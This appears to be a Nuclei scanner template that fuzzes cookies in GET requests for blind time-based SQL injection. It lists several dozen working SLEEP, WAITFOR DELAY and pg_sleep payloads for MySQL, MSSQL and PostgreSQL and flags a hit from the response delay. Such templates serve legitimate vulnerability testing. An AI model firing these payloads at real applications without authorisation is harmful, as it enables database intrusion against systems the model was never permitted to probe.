http:
- analyzer:
    name: time_delay
  attack: pitchfork
  fuzzing:
  - fuzz:
    - '{{injections}}'
    mode: single
    part: cookie
    type: replace
  matchers:
  - part: analyzer
    type: word
    words:
    - 'true'
  payloads:
    injections:
    - ' (1=1 AND SLEEP([SLEEPTIME]))/'
    - ' (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))bAKL) AND ''vRxe''=''vRxe'
    - ' (SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)/'
    - ' (select*from(select(sleep([SLEEPTIME])))a)'
    - ' (select*from(select(sleep([SLEEPTIME])))a)=1'
    - ' / sleep([SLEEPTIME]) '
    - ' 1 WAITFOR DELAY ''0:0:[SLEEPTIME]''-- udTV'
    - ' ; waitfor delay ''0:0:[SLEEPTIME]'' -- '
    - ' and 0 in (select sleep([SLEEPTIME]) ) '
    - ' and 0 in (select sleep([SLEEPTIME]) ) -- '
    - ' and 1=(select 1 where 1=1); waitfor delay ''0:0:[SLEEPTIME]'' -- '
    - ' if(1=1) waitfor delay ''0:0:[SLEEPTIME]'' -- '
    - ' or pg_sleep([SLEEPTIME])--'
    - ' where 0 in (select sleep([SLEEPTIME]) ) -- '
    - ''' (select*from(select(sleep([SLEEPTIME])))a) '''
    - ''' (select*from(select(sleep([SLEEPTIME])))a) '''
    - ''' / sleep([SLEEPTIME]) / '''
    - ''' AND SLEEP([SLEEPTIME]) AND ''1'
    - ''' AND SLEEP([SLEEPTIME]) AND ''1)}}'
    - ''' and 0 in (select sleep([SLEEPTIME]) ) -- '
    - ''' and 0 in (select sleep([SLEEPTIME]) ) and ''''='''
    - ''' and 1=(select 1 where 1=1); waitfor delay ''0:0:[SLEEPTIME]'' --'
    - ''' if(1=1) waitfor delay ''0:0:[SLEEPTIME]'' --'
    - ''' where 0 in (select sleep([SLEEPTIME]) ) -- '
    - '''(select*from(select(sleep([SLEEPTIME])))a)'''
    - ''',0)AND pg_sleep([SLEEPTIME])--'
    - '''; waitfor delay ''0:0:[SLEEPTIME]'' --'
    - '''XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR''Z'
    - '''XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR''Z'
    - '''if(now()=sysdate(),sleep([SLEEPTIME]),0)'
    - '''zND (SELECT 52035 FROM (SELECT(SLEEP([SLEEPTIME])))YpRn)zND ''Jswp''=''Jswp'
    - ',(select * from (select(sleep([SLEEPTIME])))a)/'
    - 0' or (now()=sysdate()&&SLEEP([SLEEPTIME]))or'Z
    - 0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z/
    - 0'|(IF((now())LIKE(sysdate()),SLEEP([SLEEPTIME]),0))|'Z
    - 0'||(IF((now())LIKE(sysdate()),SLEEP([SLEEPTIME]),0))|'Z
    - 419523 AND SLEEP([SLEEPTIME])
    - P'; select pg_sleep([SLEEPTIME])--
    - '" / sleep([SLEEPTIME]) / "'
    - '" and 0 in (select sleep([SLEEPTIME]) ) -- '
    - '" and 0 in (select sleep([SLEEPTIME]) ) and ""="'
    - '" where 0 in (select sleep([SLEEPTIME]) ) -- '
    - '" where 0 in (select sleep([SLEEPTIME]) ) and ""="'
    - '"; waitfor delay ''0:0:[SLEEPTIME]'' --'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: time-based-sqli-cookie
info:
  author: reewardius
  name: SQLi - Blind Time based
  severity: critical
  tags: fuzzing-req,fuzzing-req-sqli,fuzzing-req-cookie,sqli,dast
